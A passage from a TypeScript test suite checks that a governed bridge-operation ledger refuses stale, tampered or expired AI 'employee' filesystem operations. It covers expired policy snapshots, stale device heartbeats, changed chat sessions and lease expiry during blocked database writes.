        await database`update allrice_execution_targets set metadata='{}' where id=${f.target}`;
      if (change === 'target_key')
        await database`update allrice_execution_targets set target_key='bridge.wrong' where id=${f.target}`;
      if (change === 'target_capability')
        await database`update allrice_execution_targets set capabilities='["files.read"]' where id=${f.target}`;
      if (change === 'heartbeat')
        await database`update allrice_bridge_devices set last_seen_at=clock_timestamp()-interval '91 seconds' where id=${f.device.id}`;
      if (change === 'membership')
        await database`update allrice_memberships set active=false where id=${f.membership}`;
      if (change === 'run')
        await database`update allrice_runs set state='canceled' where id=${f.run}`;
      if (change === 'policy')
        await database`update allrice_policy_snapshots set issued_at=clock_timestamp()-interval '1 hour',expires_at=clock_timestamp()-interval '1 second' where id=${f.policy}`;
      expect(await f.claim()).toBeNull();
      const [approval] = await database<
        { runtime_consumed_at: Date | null }[]
      >`select runtime_consumed_at from allrice_approval_requests where id=${req.approvalId}`;
      expect(approval?.runtime_consumed_at).toBeNull();
    },
  );
  it.each(['work_copy', 'employee', 'session', 'generation', 'payload'])(
    'does not trust a server input that claims an unrelated %s',
    async (change) => {
      const f = await fixture('allow'),
        op = f.operation();
      const binding = op.input.snapshot.binding;
      if (change === 'work_copy') binding.execution.workCopy.id = randomUUID();
      if (change === 'employee')
        binding.task.frozenConfiguration.employeeVersionId = randomUUID();
      if (change === 'session') binding.task.chatSessionId = randomUUID();
      if (change === 'generation') binding.attempt.generation = 1;
      if (change === 'payload') binding.inputDigest = digest('wrong payload');
      await expect(op.factory().createOperation(op.input)).rejects.toThrow();
      const [count] = await database<
        { count: number }[]
      >`select count(*)::int as count from allrice_runtime_operations where run_id=${f.run}`;
      expect(count?.count).toBe(0);
    },
  );
  it('does not use mutable caller objects as the source after factory construction', async () => {
    const f = await fixture('allow'),
      op = f.operation(),
      factory = op.factory();
    if (op.input.bridgePayload.capability !== 'local.fs.write')
      throw Error('wrong fixture');
    op.input.bridgePayload.arguments.content = 'changed after capture';
    op.input.snapshot.binding.inputDigest = digest(op.input.bridgePayload);
    await expect(factory.createOperation(op.input)).rejects.toThrow(
      'unavailable',
    );
  });
  it('requires explicit write baseline, but permits a parsed directory root list', async () => {
    const f = await fixture('allow');
    const write = f.operation({
      capability: 'local.fs.write',
      arguments: { path: 'test.txt', content: 'missing baseline' },
    });
    await expect(write.factory().createOperation(write.input)).rejects.toThrow(
      'unavailable',
    );
    const list = f.operation({
      capability: 'local.fs.list',
      arguments: { path: '.', limit: 100 },
    });
    expect((await list.factory().createOperation(list.input)).status).toBe(
      'ready',
    );
    expect((await f.claim())?.bridgePayload).toEqual(list.input.bridgePayload);
  });
  it('resolves an actual employee Run, chat Session and current generation through all real foreign keys', async () => {
    const f = await fixture('ask', true),
      op = f.operation();
    expect((await op.factory().createOperation(op.input)).status).toBe(
      'waiting_user',
    );
    await op.approve();
    const claim = await f.claim();
    expect(claim?.snapshot.binding.task.chatSessionId).toBe(f.sessionId);
    expect(
      claim?.snapshot.binding.task.frozenConfiguration.employeeVersionId,
    ).toBe(f.versionId);
    expect(claim?.snapshot.binding.attempt.generation).toBe(3);
    expect(
      (
        await f.ledger().startOperation({
          scope: f.task.scope,
          operationId: op.input.snapshot.binding.attempt.operationId,
          leaseToken: claim!.leaseToken,
          attempt: claim!.snapshot.binding.attempt,
          receiptId: randomUUID(),
        })
      ).mayExecute,
    ).toBe(true);
  });
  it.each([
    'generation',
    'archive',
    'owner',
    'session_version',
    'runtime_run',
    'runtime_stopped',
    'run_employee',
  ])(
    'rejects actual chat %s changes between approval and dispatch',
    async (change) => {
      const f = await fixture('ask', true),
        op = f.operation();
      await op.factory().createOperation(op.input);
      await op.approve();
      if (change === 'generation')
        await database`update allrice_conversation_runtimes set thread_generation=4 where session_id=${f.sessionId}`;
      if (change === 'archive')
        await database`update allrice_chat_sessions set archived_at=clock_timestamp() where id=${f.sessionId}`;
      if (change === 'owner') {
        const other = randomUUID();
        await database`insert into allrice_users(id,email,display_name,password_hash)values(${other},${`${other}@example.test`},'Other','not-login')`;
        await database`update allrice_chat_sessions set owner_id=${other} where id=${f.sessionId}`;
      }
      if (change === 'session_version') {
        const version = randomUUID();
        await database`insert into allrice_employee_versions(id,organization_id,workspace_id,employee_id,version,name,model,system_prompt,capabilities,config_checksum)
          values(${version},${f.device.organizationId},${f.device.workspaceId},${f.employeeId},2,'Another version','synthetic','synthetic','[]',${digest('employee 2')})`;
        await database`update allrice_chat_sessions set employee_version_id=${version} where id=${f.sessionId}`;
      }
      if (change === 'runtime_run') {
        const anotherRun = randomUUID();
        await database`insert into allrice_runs(id,organization_id,workspace_id,owner_id,state,execution_spec,input)
          values(${anotherRun},${f.device.organizationId},${f.device.workspaceId},${f.device.ownerId},'running','{}','{}')`;
        await database`update allrice_conversation_runtimes set active_run_id=${anotherRun} where session_id=${f.sessionId}`;
      }
      if (change === 'runtime_stopped')
        await database`update allrice_conversation_runtimes set state='idle',active_run_id=null,active_turn_id=null,worker_id=null where session_id=${f.sessionId}`;
      if (change === 'run_employee')
        await database`update allrice_runs set execution_spec='{}' where id=${f.run}`;
      expect(await f.claim()).toBeNull();
    },
  );
  it('checks device heartbeat after a real blocking resource lock, not the initiating timestamp', async () => {
    const f = await fixture('allow'),
      op = f.operation();
    await op.factory().createOperation(op.input);
    await database`update allrice_bridge_devices set last_seen_at=clock_timestamp()-interval '89.8 seconds' where id=${f.device.id}`;
    let locked!: () => void;
    const ready = new Promise<void>((resolve) => {
      locked = resolve;
    });
    let release!: () => void;
    const hold = new Promise<void>((resolve) => {
      release = resolve;
    });
    const blocker = database.begin(async (tx) => {
      await tx`select id from allrice_bridge_devices where id=${f.device.id} for update`;
      locked();
      await hold;
      await tx`select pg_sleep(0.3)`;
    });
    await ready;
    const claim = f.claim();
    release();
    await blocker;
    expect(await claim).toBeNull();
  });
  it('ignores a replacement initial closure when immutable input already exists', async () => {
    const f = await fixture('allow'),
      op = f.operation();
    await op.factory().createOperation(op.input);
    const altered = structuredClone(op.input.snapshot.binding);
    const payload = BridgeCommandPayloadSchema.parse({
      capability: 'local.fs.write',
      arguments: {
        path: 'different.txt',
        content: 'replacement',
        expectedSha256: null,
      },
    });
    altered.inputDigest = digest(payload);
    const factory = createGovernedBridgeOperationLedger(f.device, {
      database,
      initialOperation: { binding: altered, payload },
    });
    const resolved = await database.begin((transaction) =>
      factory.policyOptions.resolveCurrentBinding({
        transaction,
        binding: altered,
      }),
    );
    expect(resolved.inputDigest).toBe(op.input.snapshot.binding.inputDigest);
    expect(resolved.inputDigest).not.toBe(altered.inputDigest);
  });
  it.each(['create', 'dispatch', 'start', 'heartbeat'] as const)(
    'rolls back %s when its final database write crosses the authority expiry',
    async (mode) => {
      const f = await fixture(),
        op = f.operation(),
        id = op.input.snapshot.binding.attempt.operationId;
      let approvalId: string | null = null;
      let lease: Awaited<ReturnType<typeof f.claim>> = null;
      if (mode !== 'create') {
        await op.factory().createOperation(op.input);
        approvalId = (await op.approve()).approvalId;
      }
      if (mode === 'start' || mode === 'heartbeat') lease = await f.claim();
      const [before] = await database<
        { count: number }[]
      >`select count(*)::int as count from allrice_runtime_operation_events where operation_id=${id}`;
      const eventKind = {
        create: 'operation.waiting',
        dispatch: 'operation.dispatched',
        start: 'operation.started',
        heartbeat: 'lease_update',
      }[mode];
      await database`insert into b1_test_write_delay(operation_id,event_kind)values(${id},${eventKind})`;
      if (mode === 'create')
        await database`update allrice_policy_snapshots set expires_at=clock_timestamp()+interval '0.5 second' where id=${f.policy}`;
      else
        await database`update allrice_approval_requests set runtime_expires_at=clock_timestamp()+interval '0.5 second' where id=${approvalId}`;
      const call =
        mode === 'create'
          ? op.factory().createOperation(op.input)
          : mode === 'dispatch'
            ? f.ledger().dispatch({
                scope: f.task.scope,
                operationId: id,
                leaseOwner: f.device.id,
                leaseMs: 30_000,
              })
            : mode === 'start'
              ? f.ledger().startOperation({
                  scope: f.task.scope,
                  operationId: id,
                  leaseToken: lease!.leaseToken,
                  attempt: lease!.snapshot.binding.attempt,
                  receiptId: randomUUID(),
                })
              : f.ledger().heartbeat({
                  scope: f.task.scope,
                  operationId: id,
                  leaseToken: lease!.leaseToken,
                  leaseMs: 60_000,
                });
      await expect(call).rejects.toThrow('unavailable');
      const [after] = await database<
        { count: number }[]
      >`select count(*)::int as count from allrice_runtime_operation_events where operation_id=${id}`;
      expect(after?.count).toBe(before?.count);
      const [row] = await database<
        {
          snapshot: { status: string };
          lease_expires_at: Date | null;
          lease_token_hash: string | null;
        }[]
      >`
        select snapshot,lease_expires_at,lease_token_hash from allrice_runtime_operations where id=${id}`;
      if (mode === 'create') {
        expect(row).toBeUndefined();
        expect(
          (await f.ledger().readBudget(f.task.scope, f.run)).budgets[0]
            ?.reserved,
        ).toBe(0);
      } else {
        expect(row?.snapshot.status).toBe(
          mode === 'dispatch' ? 'waiting_user' : 'dispatched',
        );
        if (mode === 'dispatch') {
          expect(row?.lease_token_hash).toBeNull();
          const [approval] = await database<
            { runtime_consumed_at: Date | null }[]
          >`select runtime_consumed_at from allrice_approval_requests where id=${approvalId}`;
          expect(approval?.runtime_consumed_at).toBeNull();
        } else
          expect(row?.lease_expires_at?.toISOString()).toBe(
            lease?.leaseExpiresAt,
          );
        const [receipts] = await database<
          { count: number }[]
        >`select count(*)::int as count from allrice_runtime_operation_receipts where operation_id=${id}`;
        expect(receipts?.count).toBe(0);
      }
    },
  );
  it('does not renew an old lease that expires while the final UPDATE is blocked', async () => {
    const f = await fixture('allow'),
      op = f.operation();
    await op.factory().createOperation(op.input);
    const lease = (await f.claim())!,
      id = lease.snapshot.binding.attempt.operationId;
    const [old] = await database<{ lease_expires_at: Date }[]>`
      update allrice_runtime_operations set lease_expires_at=clock_timestamp()+interval '0.5 second'
      where id=${id} returning lease_expires_at`;
    await database`insert into b1_test_write_delay(operation_id,event_kind)values(${id},'lease_update')`;
    await expect(
      f.ledger().heartbeat({
        scope: f.task.scope,
        operationId: id,
        leaseToken: lease.leaseToken,
        leaseMs: 30_000,
      }),
    ).rejects.toThrow('lease_lost');
    const [current] = await database<
      { lease_expires_at: Date }[]
    >`select lease_expires_at from allrice_runtime_operations where id=${id}`;
    expect(current?.lease_expires_at.toISOString()).toBe(
      old?.lease_expires_at.toISOString(),
    );
  });
});
